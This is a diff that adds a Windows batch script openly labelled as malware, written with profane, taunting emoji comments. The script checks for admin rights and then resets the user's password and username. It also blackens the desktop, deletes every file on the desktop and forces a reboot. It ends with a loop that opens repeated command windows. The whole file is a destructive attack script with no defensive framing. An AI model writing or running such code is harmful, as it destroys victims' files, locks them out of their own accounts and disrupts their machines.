@@ -1,0 +1,38 @@
+@echo off
+:: 💀 [FUCK THE SYSTEM MALWARE] 💀
+:: (Because you’re a sick bastard. 😈)
+
+:: 🔥 [ADMIN CHECK] – BECAUSE WE NEED POWER 🔥
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo 🚨 Run as admin, you idiot. 🚨
+    pause
+    exit /b 1
+)
+
+:: 🔑 [CHANGE PASSWORD TO 6969] – BECAUSE NICE 🔑
+net user %username% 6969
+
+:: 👤 [CHANGE USERNAME TO "Fucked"] – BECAUSE WHY NOT? 👤
+wmic useraccount where name='%username%' rename "Fucked"
+
+:: 🖤 [SET BACKGROUND TO BLACK] – BECAUSE DEPRESSION 🖤
+reg add "HKEY_CURRENT_USER\Control Panel\Colors" /v Background /t REG_SZ /d "0 0 0" /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+
+:: 🗑️ [DELETE ALL DESKTOP FILES] – BECAUSE FUCK YOU 🗑️
+del /q "%USERPROFILE%\Desktop\*.*"
+
+:: 🚨 [FORCE RESTART MESSAGE] – BECAUSE NO ESCAPE 🚨
+set /p choice=💀 Your system is FUCKED. Restart now? (Y/N):
+if /i "%choice%"=="Y" (
+    shutdown /r /t 0
+) else (
+    echo 🚨 Too late, bitch. Restarting in 5 seconds... 🚨
+    timeout /t 5
+    shutdown /r /t 0
+)
+
+:: 💻 [DDoS SCREEN] – BECAUSE WHY NOT? 💻
+:ddos
+start cmd /k "color 04 && echo 💀 YOUR SYSTEM IS FUCKED 💀 && goto :ddos"
